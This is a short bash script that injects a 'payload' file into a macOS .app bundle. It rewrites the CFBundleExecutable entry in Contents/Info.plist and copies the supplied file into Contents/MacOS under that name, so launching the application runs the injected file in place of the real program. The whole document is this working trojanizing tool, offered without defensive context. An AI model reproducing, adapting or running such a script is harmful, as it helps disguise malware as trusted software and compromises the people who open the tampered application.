#!/bin/bash
# License: The MIT License (MIT)
# Author Zuzzuc https://github.com/Zuzzuc/
TRUESRC=$(echo "$1" | sed 's%\\%%g') && TRUESRC=$(echo "$TRUESRC" | sed -e 's%[[:space:]]*$%%') && TRUEPATH=$(echo "$2" | sed 's%\\%%g') && TRUEPATH=$(echo "$TRUEPATH" | sed -e 's%[[:space:]]*$%%')
if [ "$1" == "" ] || [ "$2" == "" ];then
	echo "Incorrect usage"
	exit 1
else
	if [ "$3" == "" ];then
		PayloadName=$RANDOM
	else
		PayloadName="$3"
	fi
	AR=$(wc -l < "$TRUESRC/Contents/Info.plist" )
	R=1
	chmod 755 "$TRUESRC"
	while [ $R -lt $AR ];do
		line=$(awk "FNR == $R { print; exit }" "$TRUESRC/Contents/Info.plist")
		if [ $(echo "$line" | grep -q "<key>CFBundleExecutable</key>" && echo $? || echo 1) = 0 ];then
			let R=R+1
			sed -i '' -e "$R s%<string>.*</string>%<string>$PayloadName</string>%" "$TRUESRC/Contents/Info.plist"
			let R=AR+1
		else 
			let R=R+1
		fi
	done
	cp "$TRUEPATH" "$TRUESRC/Contents/MacOS/$PayloadName"
	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
fi